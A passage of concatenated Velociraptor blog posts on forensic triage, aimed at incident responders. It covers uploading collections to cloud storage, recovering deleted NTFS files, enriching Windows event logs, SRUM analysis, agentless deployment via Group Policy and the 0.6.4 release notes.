on this cloud project. Clicking the Create button will download a JSON
file to your system with the private key in it.

![](../../img/1__rsKWeCDPrO9AffAuG2k__rA.png)
![](../../img/1__qGr13ir9qftvzxJUoM5D6A.png)

Note the service account’s email address. Currently this account has
no permissions at all — but we will allow it to write objects into our
upload bucket later.

![](../../img/1__EhghHAfmjbZFU2vhiPvhYA.png)

Next we create a bucket to store our collected zip files I will call
it “velociraptor-uploads-121”:

![](../../img/1__ehJ3qfAiaUMNPXoy4mUhEg.png)

Selecting the “Permissions” tab, we are able to add the service
account as a member — we will only give it the ability to write on a
bucket and create new objects. This is important since is means that
the service account is unable to read or list objects in this
bucket. Since we will embed the service account key in our config file
we need to make sure it can not be misused to compromise collections
from other machines.

![](../../img/1__vzszs0OjRzdqMRlXbesuNw.png)

#### Creating and embedding a custom artifact

Now we are ready to create our custom artifact. Our artifact will
first collect the **KapeFiles** targets we require into a locally
written zip file, and then using the above credentials, upload the zip
file to the cloud. Finally we will delete the temporary file from the
endpoint. As an added measure of security we specify a password on the
collected zip file.

<script src="https://gist.github.com/scudette/4eea88eb780af37c676b304168b3ffef.js" charset="utf-8"></script>

The above artifact is fairly easy to read:

1.  Using the **collect()** plugin we are able to collect one or more artifacts into a local zip file. We use the **tempfile()** function to provide a local filename for us to write on. Note that Velociraptor will clean the temp file at the end of the query automatically. We can also specify a password for encrypting the collection zip file.
2.  The **collect()** plugin returns a single row with the name of the container (i.e. the Zip file we write on). We then call the **upload\_gcs()** function on this file name to upload this file to GCS. We use the credentials we obtained earlier, bucket and project names and finally we rename the uploaded file according to the timestamp.

Next we simply embed this configuration file in the binary as we did in part 2:

```
F:> velociraptor.exe config repack config.yaml my_velo.exe
```

We can send this file to our accomplice and have them run it as an
administrator to simply collect everything and upload to the cloud
automatically. Alternatively we can push this binary out via Group
Policy Scheduled tasks as well, or even via another EDR tool — it
really does not matter how we get the code executing on the endpoint.

The below screenshot shows the debug log from running the
collector. We can see the container finalized, then uploaded to GCS
with its hashes calculated. When Velociraptor uploads the container to
GCS, Google’s server calculate the md5 and return it together with
other object attributes. Velociraptor then compares this hash to the
one it calculated before to ensure the file landed properly on the
cloud bucket.

Finally, then the temp file is removed and the query is complete.

![](../../img/1__PxNDr9zbvyzf__LgecPp__MQ.png)

#### Conclusions

This concludes our three part series about triaging with
Velociraptor. Triaging is about collecting files quickly in order to
preserve as much of the volatile machine state as possible, then
quickly analyze the data for evidence of compromise.

Although Velociraptor is normally installed as a client/server so it
is always available on the endpoint, it does not have to be used in
this way. The key strength of Velociraptor is its flexibility and
ability to adapt to any situation through the use of the powerful
Velociraptor Query Language (VQL).

Users who feel comfortable writing their own VQL can adapt Velociraptor easily to evolving situations and collect new artifacts quickly. Check out the official [VQL reference](https://www.velocidex.com/docs/vql_reference/), [Download the latest version](https://github.com/Velocidex/velociraptor) of Velociraptor from GitHub and join the community of power users.

---END OF FILE---

======
FILE: /content/blog/2019/2019-11-15_recovering-deleted-ntfs-files-with-velociraptor-1fcf09855311/_index.md
======
---
title: Recovering deleted NTFS Files with Velociraptor
description: Deep forensics on the endpoint
date: '2019-11-15T00:38:44.349Z'
categories: []
keywords: []
---

#### By Mike Cohen

![](../../img/1__UeLogCK7iLyCv__VWc7RMRA.jpeg)

On a recent engagement we responded to an intrusion where the attacker has added a new scheduled task to the Windows Task Scheduler directory (_%systemroot%\\System32\\Task_) some time ago. This is a common TTP for achieving persistence (See [Mitre Att&ck](https://attack.mitre.org/techniques/T1053/)). Unfortunately the actual task file was later removed and event logs were cycled past the time of interest.

In that case we were able to use Velociraptor to employ some deep forensic techniques and with a bit of luck were able to recover the deleted task file.

In this post I will explain the technique and demonstrate it on a deliberately deleted file. It should be noted that this technique relies on the file not being overwritten and the MFT entry not being reused by the system. So there is a rather large probability that it won’t work for any specific file. It is worth knowing though, just in case you get lucky and are able to recover a file critical to your incident!

#### NTFS and The Master File Table

On Windows systems the most common filesystem is the NTFS filesystem. I won’t go into details about NTFS as there are many great references — the following description is extremely simplified and mentions just the concepts required to follow the discussion.

NTFS uses a large file called the $MFT — the master file table, containing the metadata of all files on the volume. This file is essentially an array of equal sized structures called MFT entries. Each entry has an MFT ID (which is the index of the entry in the array). Thus MFT Entry 0 is the first entry in the $MFT file, entry 100 is the 100th entry and so on.

Each file on disk is represented by one or more MFT entries. In NTFS, files contain multiple attributes, such as the file’s names (long name and/or short names) and standard information like timestamps etc. The file’s MFT entry contains information about the file’s attributes. One of the most important attributes for a file in NTFS is the $DATA attribute — which is also stored in the MFT entry for the file. The $DATA attribute contains the file’s runlist — essentially a list of clusters (disk sectors) containing the file’s actual data.

When a file is deleted, the MFT Entry for the file is marked as unallocated and is free to be used by the Operating System to store another file. If we are lucky though, the OS has not reused the MFT entry for the deleted file of interest, and we would be able to still read the data.

Additionally, when a file is deleted, the blocks that store the file’s data are also marked as unallocated, and are free for reuse — but they are not actually wiped and so might be available for recovery.

This post is about trying to recover such deleted files from NTFS. This is the realm of deep forensic analysis but Velociraptor allows us to perform this analysis instantly and remotely on the live system — giving a unique capability for recovering evidence of intrusions quickly and efficiently.

#### Scenario

To demonstrate this scenario I will create a file called “secret\_file.txt”. I will paste a familiar text into the file. I will then delete the file and try to recover it using deep NTFS forensic analysis.

#### The setup

![](../../img/1__WfcNInJv6JcYN2CL__dJAgg.png)

I will now dump the MFT from the endpoint by collecting the **Windows.NTFS.MFT** artifact.

![](../../img/1__g4O0YGpky5hH__P2TScT7zQ.png)

This artifact will cause the endpoint to parse the $MFT file and emit a single row for each MFT entry that represents a file on disk. The VQL Query shown above simply calls on the _parse\_mft()_ VQL plugin. Note that this is different than simply collecting the $MFT file as can be done with the **Windows.KapeFiles.Targets** artifact — in that case we still need to parse the $MFT with another tool. This time we parse the $MFT on the endpoint itself and simply stream the results to the server.

The nice thing about parsing the entire $MFT is that we now have a complete record of all files on the system (without having to walk directories etc). However this table is rather large! On my test system the produced CSV file is over 130mb in size (Being text it compresses really well though!).

#### Performance check

This particular collection is rather heavy so I always check Velociraptor’s impact on the endpoint when I run such heavy collections. I simply open the **Host Information** screen and click the **VQL Drilldown** to see the client’s CPU and memory footprint as the query is running (Velociraptor collects its own footprint telemetry constantly).

In this case the query took around 5 minutes to fully complete, the CPU load spiked up to 150% for about 1 minute and the rest of the time was spent sending the large payload to the server with minimal CPU utilization. Top memory footprint was 120Mb for a few minutes falling to the baseline of 30mb quickly after the query completed.

![](../../img/1__HZsiiepiiL__PYUIz7zuHUA.png)

If the collection was taking too long or using up too many resource on
the endpoint, I can always cancel it by clicking the “Stop” button in
the **Collected Artifacts** GUI. Velociraptor will immediately abort
the query on the endpoint when the collection is cancelled in the GUI.

#### Viewing the results

We can view the results of the query by clicking the Results tab. We see a number of useful columns including the EntryNumber (i.e. the MFT ID we discussed before), the InUse column indicates if the file is still in use or deleted as well as the full path of the file stored at that MFT ID. Note that this artifact simply prints the file stored at each consecutive MFT entry — there are over 255,000 rows in our example! (Not shown are created and modified timestamps as well for each file)

![](../../img/1__zKoK8jx__DiM17yhyDofLTQ.png)

The Velociraptor GUI only displays the first 500 rows from each artifact in order to keep the GUI fast and responsive. Because this query returned over 250k rows, we would need to download the data and post-process it. The easiest way is to prepare a download package and download it from the provided link. The CSV file can then be extracted and processed with other tools (e.g. grep or a database).

![](../../img/1__GWpawiYVVZxrUgkmD__moBg.png)

#### Tweaking the query

In this exercise we already know the name of the file we are after is **secret.txt** so we do not really need a complete dump of the entire MFT — we only want all the MFT entries with the filename containing the word “secret”. We can therefore customize the artifact by adding a VQL **WHERE** clause after the query to only send interesting rows to the server. We will add a new parameter **FullPathRegex** allowing the user to customize the filtering terms in the future (for example search for deletions in the Tasks directory).

![](../../img/1__AQwNLywmhyRkWS4jwhzeow.png)

Now we can collect the customized artifact specifying that only rows matching “secret” will be retrieved.

![](../../img/1__yaJsmM9lSFeGU8xW__q5qmA.png)

The result is similar to the full dump above but now only 5 rows are returned from the endpoint. This is much faster than getting all 130mb CSV file and post processing it (Collection time is less than 1 minute now). By refining the artifact we have made Velociraptor more surgical in its approach — only returning the data we really want

![](../../img/1__hH7zhLQt__TK2JgWOVFvrDw.png)

We can see in the above that the file is deleted (InUse is false) and its EntryNumber is 86474. We can use this to try and recover the file’s data by collecting the **Windows.NTFS.Recover** artifact for this MFT entry

![](../../img/1__ndPT5EnGcAm5fJYaHmbcAg.png)

The **Windows.NTFS.Recover** simply uploads to the server all NTFS streams belonging to the MFT entry specified. We can see both $FILE\_NAME attributes (long and short names) and the $DATA attribute.

![](../../img/1__OaIiPJRPjqFi75nqQ6pOZw.png)

Since the file is deleted, the MFT Entry is not allocated and a new file may be written in this MFT entry at any time. Therefore the contents of the $DATA stream may be completely unrelated to the file we are looking for. We can use the content of the $FILE\_NAME and $STANDARD\_INFORMATION to double check the validity of the file and confirm it is the file we expect.

To view the file we simple prepare a download as before and use an archiving tool to open the ZIP file. We then extract the $DATA stream and confirm it is the file we expected.

![](../../img/1__znDhPzuQ3Uy0hKkR0xPc7Q.png)
![](../../img/1__Z__8h6SVkmkKVc6xSJlJtuA.png)

#### Conclusions

Velociraptor provides access to low level NTFS analysis techniques within VQL. This means we can build VQL artifacts to automate some of the low level analysis — such as the recovery of deleted files, and scanning the MFT for remnants of old deleted files.

There are two pieces of information we can gather from such low level analysis:

1.  The deleted file metadata is found in the unallocated MFT entry and includes the file’s creation and modification timestamps.
2.  The data of the file may still exist on disk.

In practice, MFT entries are reused pretty quickly and so there is a high chance that the old deleted entry will not remain. Additionally $DATA blocks may also be reused so it is likely that even if we identify a deleted file we may not be able to recover its data using this technique.

So in practice, we use the **Windows.NTFS.MFT** artifact to collect metadata about deleted files, even though we are usually not able to recover their data.

If the system has an SSD rather than a spinning disk we are unlikely to recover any deleted file’s data. This is because SSDs aggressively reclaim unused blocks and wipe the block so it can be remapped in the wear leveling pool \[see [here](https://blog.elcomsoft.com/2019/01/life-after-trim-using-factory-access-mode-for-imaging-ssd-drives/)\].

Do you commonly use this technique in your investigations? Share your thoughts below.

---END OF FILE---

======
FILE: /content/blog/2019/2019-11-12_windows-event-logs-d8d8e615c9ca/_index.md
======
---
title: Windows Event Logs
description: What do they mean?
date: '2019-11-12T10:40:24.152Z'
categories: []
keywords: []
---

#### By Mike Cohen

![](../../img/1____Pq____KfTKLBbQffNGN__aHg.jpeg)

One of the most critical sources of data when responding to an incident on windows systems is the event logs. Windows event logs record security significant events.

However, unlike more traditional Unix syslogs, the Windows Event Log system is more complex and there are a number of potential problems that an investigator can run into.

In this post we explore the windows event log system from the point of view of the investigator. We then see how tools such as Velociraptor can be used to work around its limitations.

#### Responding to an incident

Consider an incident occurred on one of your systems. You would like to investigate it and so collect all the event log files from **C:\\Windows\\System32\\WinEVT\\Logs\\\*.evtx**.

The logs are stored in binary format so you will need to post process the files. Luckily there are a number of tools out there that will do that for you. Here is a typical output from the [`dumpevtx`](https://github.com/Velocidex/evtx) tool for a particular event from the Security.evtx log file:

<script src="https://gist.github.com/scudette/0b88f27e258021eecf7de9b8c0861184.js"></script>

This event looks interesting but it is not quite clear what it is really talking about. We see some potentially useful items like **SubjectUserSid** and **PrivilegeList** but we are missing some critical context around this message.

Lets look at the same event with the windows Event Viewer GUI:

![](../../img/1__T4Q8HxIiHlGTJ61EEXvI9Q.png)

This is much better! We now know the message indicates the user was assigned some special privileges.

Where does this message come from and why is it not shown by typical EVTX parsers?

It turns out that the message of the event is not actually stored in the EVTX file at all — it is actually stored in a DLL and it is bound to the event in the log via some complicated algorithm.

#### Event Messages

Windows event logs do not store the full event message. Instead an **Event Provider** registers a message DLL that contains the full message. The event itself simply stores the index of the message in the Message Table as the Event ID. Note that event IDs are just a number into an event table and are commonly reused by different providers. It is the unique combination of channel, provider and Event ID that identifies the message (so for example searching for Event Id 1000 yields many different unrelated messages because many providers reuse that event ID).

The figure below illustrates how the Windows Event Viewer is able to print the proper Event Message:

![How the Windows Event Viewer displays event log messages](../../img/1__PM4my0gv8exjy__F5KRhdBg.png)
How the Windows Event Viewer displays event log messages

When a user selects an event in the Event Viewer, the application reads the **Provider**, **EventID** and **EventData** fields from the event itself — in the above example, the Provider was **Microsoft-Windows-Security-Auditing**, EventID was **4672** and the EventData has items such as **SubjectUserSid** etc.

Next the event viewer consults the registry at the key **HKEY\_LOCAL\_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Security\\Microsoft-Windows-Security-Auditing** and reads the value **EventMessageFile**.

That value is the location of a dll which contains the messages for
this provider. On my system, the DLL is located at
`%SystemRoot%\\system32\\adtschema.dll` (Note that many DLLs use
localizations and so the dll could be located in MUI files).

![](../../img/1__SLH4iiByHYIz8HyJyOxAEw.png)

The DLL has a resource section with a MESSAGE\_TABLE type. The event viewer then uses this to extract the message which looks like:

```sh
Special privileges assigned to new logon.%n%nSubject:%n%tSecurity ID:%t%t%1%n%tAccount Name:%t%t%2%n%tAccount Domain:%t%t%3%n%tLogon ID:%t%t%4%n%nPrivileges:%t%t%5
```

The event viewer then interpolates the EventData items into the message by their position — for example %1 is replaced with **SubjectUserSid** etc. Additionally %t is a tab and %n is a new line.

#### What could go wrong?

The previous section examined how event logs are actually stored on the system. In practice there are a number of pitfalls with this scheme:

1.  If an EVTX file is taken from one system to another, the relevant DLL may not be present. This is more common with bespoke software that is not commonly used. In this case the investigator has no idea what the message the event is trying to convey.
2.  If software is uninstalled from the system, the message DLL may be removed. This makes it hard to view events in the event log from the time it was installed (in a sense information is wiped from the event log).

In both of these cases, the investigator will need to figure out the correct event message independently. Luckily in the age of the internet there are many web sites that catalog some of the common event ids and what they mean:

![](../../img/1__GmXWvkFj2vFkPEqa3jSFLQ.png)

But it is simply not practical to search every event id. For less commonly used providers the event ids may not be indexed on the web at all. In this case the investigator is left with no idea what a specific event entry means and might miss some critical evidence

#### Velociraptor’s parse\_evtx() VQL plugin

In the latest Velociraptor release ([0.3.6](https://github.com/Velocidex/velociraptor/releases)), the **parse\_evtx()** plugin is now including the event messages directly in the VQL output. This automatically enriches the event log data collected by the Velociraptor host visibility tool.

![Velociraptor can interpolate and attach the event message to every log message it relays](../../img/1__uY97EUuaI__fI3eUBQFToLg.png)
Velociraptor can interpolate and attach the event message to every log message it relays

In the above we see the result of the simple VQL query:

```vql
SELECT * FROM parse_evtx(filename='c:/Windows/System32/Winevt/logs/Security.evtx')
```

You can see an additional field now, called **Message** containing the event message with the Event Data interpolated into it. This provides a lot of context around what the event is supposed to do.

#### What about existing EVTX files?

In the last section we saw how Velociraptor can enrich event logs as it is forwarding them to the server but what if we have just the evtx files — possibly we just acquired the files using bulk upload artifacts such as the **Windows.KapeFiles.Targets** artifact?

In that case our analysis machine may not actually have the correct message dlls installed and Velociraptor may fail to retrieve the event messages.

We need a way to maintain a library of event id’s for different providers and the messages they represent. This way we can instantly look up the correct message on demand — without needing to have DLLs installed.

[Velocidex](https://www.velocidex.com/), the company behind Velociraptor is an innovative software company crafting many free and open source digital forensics tools. In fact Velociraptor’s EVTX parsing is implemented by the [Velocidex/evtx](https://github.com/Velocidex/evtx) project on GitHub. You should check it out!

The project releases a stand along command line tool for parsing and examining windows event log format. In this post, I would like to demonstrate the latest “extract” feature:

![](../../img/1__ABF6klKd0xQ82TvhOEq__hw.png)

The **extract** command walks all providers in the registry, gathers their message DLLs and parses the message table resource for each. Then, all the messages are stored in a sqlite database. Sqlite being the de facto standard for portable databases can be easily consumed by other tools written in many languages. The total size of the database is modest (I have extracted all event log messages on Windows 2019 server to about 23MB SQLite file).

Now we can easily use the database to resolve our provider and event id to a message:

![](../../img/1__SRuWlPV0wk754__jlxI2tMw.png)

Alternatively we can simply use SQLite directly to query the database

```
$ sqlite3 mydb.sqlite
SQLite version 3.24.0 2018-06-04 19:24:41
Enter ".help" for usage hints.
sqlite> **SELECT message FROM providers join messages on providers.id = messages.provider\_id where providers.name = 'Microsoft-Windows-Security-Auditing' and messages.event\_id = 4672;**
_Special privileges assigned to new logon.%n%nSubject:%n%tSecurity ID:%t%t%1%n%tAccount Name:%t%t%2%n%tAccount Domain:%t%t%3%n%tLogon ID:%t%t%4%n%nPrivileges:%t%t%5_
```

#### Enriching old event log files

We have shown how `dumpevtx` can use our sqlite database to retrieve
the messages for each event id individually but this leaves us to
interpolate the full data by hand — no fun indeed!

You can also use `dumpevtx` to export the events into JSON, and
automatically resolve event IDs with the sqlite database too by
providing the database with the `--messagedb` flag.

```
F:\\>dumpevtx.exe parse --messagedb mydb.sqlite c:\\Windows\\System32\\winevt\\Logs\\Security.evtx
```

![Parsing the EVTX file with the assistance of the event id database. The message interpolates the Event Data into it.](../../img/1__Uk794PvLspR__m5WX8ENDZw.png)
Parsing the EVTX file with the assistance of the event id database. The message interpolates the Event Data into it.

#### Conclusions

The Windows Event Log system is fairly complex — it is not enough to just copy out the \*.evtx files because the information content of the log is spread throughout the filesystem in DLLs and registry keys. For many event types there is enough context in the EventData or UserData fields of the event log but in many cases, without the actual message corresponding to the event ID we lose critical meaning.

It is essential therefore to include the original message for each
event log. We have shown how Velociraptor is able to include this
critical information automatically. We also present the `dumpevtx`
project which allows collecting messages in a database so events can
be matched up quickly and easily with their correct messages without
requiring the original program that generated the message to be
installed on the analyst system.

---END OF FILE---

======
FILE: /content/blog/2019/2019-12-31_digging-into-the-system-resource-usage-monitor-srum-afbadb1a375/_index.md
======
---
title: Digging into the System Resource Usage Monitor (SRUM)
description: Uncovering history with Velociraptor
date: '2019-12-31T00:38:44.349Z'
categories: []
keywords: []
---

## Uncovering history with Velociraptor

#### By Mike Cohen

![](../../img/0_yFgW11ar3mogfljd.jpg)

Commonly in many incident response scenarios we need to gather evidence of program executions. For example, a phishing email delivering malware was sent to a user — did the user click on it? Did the malware run? was the email forwarded to any other users?

One of the most useful sources of evidence of execution on Windows is the System Resource Usage Monitor (SRUM). It was first described by Yogesh Khatri in the seminal paper “[Forensic implications of System Resource Usage Monitor (SRUM) data in Windows 8](https://www.sciencedirect.com/science/article/pii/S1742287615000031)”.

SRUM is a feature in modern Windows systems which collect statistics on execution of binaries. The information is stored in an Extensible Storage Engine (ESE) database. ESE is Microsoft’s proprietary single file database format, acting similarly to SQLite, as a default storage engine for many applications — including the SRUM database.

As from the [0.3.7 release of Velociraptor](https://github.com/Velocidex/velociraptor/releases/tag/v0.3.7), an ESE parser is built into the client, allowing VQL artifacts to directly query ESE databases. This opens up the exciting possibility of extracting and querying information from the SRUM database directly on the endpoint.

Although this post will not go into detail on SRUM itself (This is covered in detail [elsewhere](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492184583.pdf)), I will describe how Velociraptor’s SRUM artifact can be used to hunt efficiently across many thousands of endpoints to collect evidence relevant to DFIR investigations.

Have you ever noticed the windows task manager’s “App History” tab?

![The Task Manager App History tab](../../img/1_1t_puy5xiAPvR4XUosSQtg.png)*The Task Manager App History tab*

This tab shows running counts of many applications, broken by user that ran them, including network traffic, and total CPU time. Where does the information come from?

It turns out that the SRUM database is stored within tables inside the ESE database at *%windir%\System32\sru\SRUDB.dat.*

Let’s examine Velociraptor’s **Windows.Forensics.SRUM** artifact

![](../../img/1_Ajiq0F2RaIoqhj8PnuoCvA.png)

The artifact contains several sources — examining a different table within the SRUM ESE database. As can be seen, the ESE database is parsed using Velociraptor’s raw NTFS parser since it is usually locked while the system is running. The artifact allows filtering for a specific application name by regular expression.

The SRUM database actually contains many tables collecting different runtime telemetry. Some of these tables are not publicly documented but may still contain valuable information. It is worthwhile inspecting the raw database file using an external tool (e.g. [Nirsoft **ESEDatabaseView](https://www.nirsoft.net/utils/ese_database_view.html)**). The **Windows.Forensics.SRUM** artifact will by default upload the raw ESE file to the server as well as parse it.

To demonstrate the artifact, I am now going to collect it from one of my endpoints.

![](../../img/1_tQOsldVH7wYGPV56wr0xBA.png)

I simply search for my endpoint in the GUI, then click* “Collect More Artifacts” *and search for **SRUM** in the search box. I then add this artifact and click “**Next**” to launch it.

![](../../img/1_WimaboQJfGvgXKNY6HeCEQ.png)

The above shows that the endpoint took around 80 seconds to collect the entire artifact. This includes uploading the 28MB SRUM database, parsing some of the tables in it, and uploading the parsed results.

![](../../img/1_fG5W7kOMtrmnB3mnGuWyeQ.png)

Viewing the logs generated by the executing query give an indication of how the query is progressing.

### The Execution Stats source

Let's inspect a sample from the “Execution Stats” source

![](../../img/1_3lM3jXI47Z1eDQVjoLSfYQ.png)

We get some interesting information, such as the time an application ran (this is determined by the **EndTime** and **DurationMS** — the **Timestamp **column actually refers to when the ESE record was written which may be some time later), the user who ran it, and the duration it was executing. Sometimes the information also includes valid network transfer count which might be useful for some investigations (e.g. exfiltration).

### Application Resource Usage

This artifact source stores cumulative information about the running executable. Therefore it can not be used to determine exact start time (The Timestamp field corresponds to when the record was written to the ESE database). The advantage here is that the full path is provided, making it easy to search for executables running from unusual locations (e.g. temp folders and network drives).

![](../../img/1_RLUyUIKBk5VHpHwIlOMAKQ.png)

## Hunting the SRUM database

Sometimes we need to determine which endpoint in our fleet has run a particular binary — perhaps with a unique name. For example, a phishing campaign might launch a trojan malware with a specific name.

To simulate this I copied a binary to the user’s temp folder with the unique name `sdfjhsdfc.exe`. I then ran it for a while.

Next, I created a hunt, but this time, instead of dumping the entire SRUM table, I filtered the results by the name of the binary.

![](../../img/1_KGdoKsM1v3RcqRhqREVueg.png)

Within minutes I was able to determine exactly which user executed the binary, and on which endpoint. If a machine is not online when I first launched the hunt, it will run the hunt when it next connected to the server and deliver its results later.

![](../../img/1_p7m7XfByE0RzuaeCB-GEfw.png)

## Conclusions

SRUM is an excellent source of evidence of execution of binaries. In practice we often see upwards of 60 days of evidence within the ESE database — so it goes back quite a long time!

There is a wealth of information available within the SRUM database, but current Velociraptor artifacts have some limitations:

1. The data written to the SRUM ESE database is first cached in the registry and then flushed to the database periodically (This is why much of the time the **Timestamp** field will be much later than the **EndTime)**. Currently Velociraptor’s artifacts are not able to parse the registry cache so very recent executions will probably be missed.

1. Currently Velociraptor only parses a few tables from the SRUM database, but many additional tables appear to be useful.

These limitations are likely to improve in future as more artifacts are written to fully extract information the SRUM database.

## Training

If you happen to be in Sydney or Melbourne and would like to learn more about incident response techniques such as the SRUM database and how to apply them with Velociraptor, consider joining us in our [upcoming training events](https://www.velocidex.com/training/).

---END OF FILE---

======
FILE: /content/blog/2019/2019-03-02/_index.md
======
---
date: 2019-03-02T04:10:06Z
description:  |
  There has been a lot of interest lately in "Agentless hunting"
  especially using PowerShell.  This blog post explores an agentless
  deployment scenario, where we do not want to install Velociraptor
  permanently on the end point, but rather push it to end points
  temporarily to collect specific artifacts.

title: Agentless hunting with Velociraptor
categories: ["Blog"]
noindex: true
---

There has been a lot of interest lately in Agentless hunting especially
using PowerShell. There are many reasons why Agentless hunting is
appealing - there are already a ton of endpoint agents and yet another
one may not be welcome. Sometimes we need to deploy endpoint agents as
part of a DFIR engagement and we may not want to permanently install yet
another agent on end points.

This blog post explores an agentless deployment scenario, where we do
not want to install Velociraptor permanently on the end point, but
rather push it to end points temporarily to collect specific artifacts.
The advantage of this method is that there are no permanent changes to
the end point, as nothing is actually installed. However, we do get the
full power of Velociraptor to collect artifacts, hunt for evil and
more\...

Agentless Velociraptor
======================

Normally when deploying Velociraptor as a service, the binary is copied
to the system and a service is installed. The service ensures that the
binary is restarted when the system reboots, and so Velociraptor is
installed on a permanent basis.

However in the agentless deployment scenario we simply run the binary
from a network share using group policy settings. The downside to this
approach is that the endpoint needs to be on the domain network to
receive the group policy update (and have the network share accessible)
before it can run Velociraptor. When we run in Agentless mode we are
really after collecting a bunch of artifacts via hunts and then exiting
- the agent will not restart after a reboot. So this method is suitable
for quick hunts on corporate (non roaming) assets.

In this post I will use Windows 2019 Server but this should also work on
any older version.

Creating a network share
------------------------

The first step is to create a network share with the Velociraptor binary
and its configuration file. We will run the binary from the share in
this example, but for more reliability you may want to copy the binary
into e.g. a temp folder on the end point in case the system becomes
disconnected from the domain. For quick hunts though it should be fine.

We create a directory on the server (I will create it on the domain
controller but you should probably not do that - find another machine to
host the share).

![image](1.png)

I created a directory C:\\\\Users\\\\Deployment and ensured that it is
read only. I have shared the directory as the name Deployment.

I now place the Velociraptor executable and client config file in that
directory and verify that I can run the binary from the network share.
The binary should be accessible via
\`\\\\\\\\DC\\Deployment\\velociraptor.exe\`:

![image](2.png)

Creating the group policy object.
---------------------------------

Next we create the group policy object which forces all domain connected
machines to run the Velociraptor client. We use the Group Policy
Management Console:

![image](3.png)

Select the OU or the entire domain and click \"Create New GPO\":

![image](4.png)

Now right click the GPO object and select \"Edit\":

![image](5.png)

We will create a new scheduled task. Rather than schedule it at a
particular time, we will select to run it immediately. This will force
the command to run as soon as the endpoint updates its group policy
settings (i.e. we do not want to wait for the next reboot of the
endpoint).

![image](6.png)

Next we give the task a name and a description. In order to allow
Velociraptor to access raw devices (e.g. to collect memory or NTFS
artifacts) we can specify that the client will run at
NT\_AUTHORITY\\\\SYSTEM privileges, and run without any user being
logged on. It is also worth ticking the \"hidden\" checkbox here to
prevent a console box from appearing.

![image](7.png)

Next click the Actions tab and add a new action. This is where we launch
the Velociraptor client. The program will simply be launched from the
share (i.e. \\\\\\\\\\\\\\\\DC\\\\Deployment\\\\velociraptor.exe) and we
give it the arguments allowing it to read the provided configuration
file (i.e.
\--config \\\\\\\\\\\\\\\\DC\\\\Deployment\\\\client.config.yaml client -v).

![image](8.png)

In the setting tab we can control how long we want the client to run.
For a quick hunt this may be an hour or two but maybe for a DFIR
engagement it might be a few days. The GPO will ensure the client is
killed after the allotted time.

![image](9.png)

Once the GPO is installed it becomes active for all domain machines. You
can now schedule any hunts you wish using the Velociraptor GUI. When a
domain machine refreshes its group policy it will run the client, which
will enroll and immediately participate in any outstanding hunts - thus
collecting and delivering its artifacts to the server. After the
allotted time has passed, the client will shut down without having
installed anything on the endpoint.

You can force a group policy update by running the gpupdate program. Now
you can verify that Velociraptor is running:

![image](10.png)

Persistence
-----------

Note that when running Velociraptor in agent less mode you probably want
to configure it so that the writeback file is written to the temp
directory. The writeback file is how the client keeps track of its key
material (and identity). The default is to store it in the client\'s
installation folder, but you should probably change it in the client\'s
config file:

``` {.sourceCode .yaml}
Client:
  writeback_windows: $TEMP\\velociraptor.writeback.yaml
```

The file will remain in the client\'s temp directory so if you ever
decide to run the agentless client again (by pushing another group
policy) the client id remains the same.

---END OF FILE---

======
FILE: /content/blog/2022/2022-03-23-release-notes/_index.md
======
---
title: "Velociraptor 0.6.4 Release"
description: |
   Velociraptor Release 0.6.4 is now LIVE. This post discusses some of the new features.
tags:
 - Release
author: "Mike Cohen"
date: 2022-04-21
---

I am very excited to announce the latest Velociraptor release
0.6.4. This release has been in the making for a few months now and
has a lot of new features.

The main focus of this release is in improving path handling in VQL to
allow for more efficient path manipulation. This leads to the ability
to analyze dead disk images which depends on accurate path handling.

## Path handling

A path is a simple concept - it is a string similar to `/bin/ls` which
can be used to pass to an OS API and have it operate on the file in
the filesystem (e.g. read/write it).

However it turns out that paths are much more complex than they first
seem. For one thing, paths have an OS dependent separator (usually `/`
or `\`). Some filesystems support path separators inside a filename
too! To read about the details check out [Paths And Filesystem
Accessors]({{< ref "/blog/2022/2022-03-21-paths/" >}}) but one of the
most interesting thing with the new handling is that stacking
filesystem accessors is now possible, for example it is possible to
open a docx file inside a zip file inside an ntfs drive inside a
partition.

### Dead disk analysis

Velociraptor offers top notch forensic analysis capability but it was
primarily used as a live response agent. Many users have asked us if
Velociraptor can be used on dead disk images. Although we rarely use
dead disk images in practice, sometimes we do encounter these (e.g. in
cloud investigations).

Previously we could not use Velociraptor easily on dead disk images
without having to carefully tailor and modify each artifact. In the
0.6.4 release we now have the ability to emulate a live client from
dead disk images. We can use this feature to run the exact same VQL
artifacts that we normally do on live systems, but against a dead disk
image. If you would like to read more about this new feature check out
[Dead Disk Forensics]({{< ref "/blog/2022/2022-03-22-deaddisk/" >}}).

## Resource control

When collecting artifacts from endpoints we need to be mindful of the
overall load that collection will cost on endpoints. For performance
sensitive servers, our collection can cause operational
disruption. For example, running a yara scan over the entire disk
would utilize a lot of IO operations and may use a lot of CPU
resources. Velociraptor will then compete for these resources with the
legitimate server functionality and may cause degraded performance.

Previously, Velociraptor had a setting called `Ops Per Second` which
could be used to run the collection "low and slow" by limiting the
rate at which notional "ops" were utilized. In reality this setting
was only ever used for Yara scans because it was hard to calculate an
appropriate setting: notional `ops` did not correspond to anything
measurable like CPU utilization.

In 0.6.4 we have implemented a feedback based throttler which can
control VQL queries to a target average CPU utilization. Since CPU
utilization is easy to measure it is a more meaningful control. The
throttler actively measures the Velociraptor process's CPU utilization
and when the simple moving average (SMA) rises above the limit, the
query is paused until the SMA drops below the limit.

![Selecting resource controls for collections](resource_control.png)

The above screenshot shows the latest resource controls dialog. You
can now set a target CPU utilization between 0 and 100%. The image
below shows how that looks in the windows task manager

![CPU control keeps Velociraptor at 15%](cpu_utilization.png)


{{% notice tip "Choosing an appropriate CPU limit" %}}

By reducing the allowed CPU utilization, Velociraptor will be slowed
down so collections will take longer. You may need to increase the
collection timeout to correspond with the extra time it takes.

Note that the CPU limit refers to a percentage of the total CPU
resources available on the endpoint. So for example, if the endpoint
is a 2 core cloud instance a 50% utilization refers to 1 full
core. But on a 32 core server a 50% utilization is allowed to use 16
cores!

{{% /notice %}}

### Iops limits

On some cloud resources IO operations per second (IOPS) are more
important than CPU loading since cloud platforms tend to rate limit
IOPS. So if Velociraptor uses many IOPS (e.g. in Yara scanning), it
may affect the legitimate workload.

Velociraptor now offers limits on IOPS which may be useful for some
scenarios. See for example
[here](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-volume-types.html)
and
[here](https://aws.amazon.com/blogs/database/understanding-burst-vs-baseline-performance-with-amazon-rds-and-gp2/)
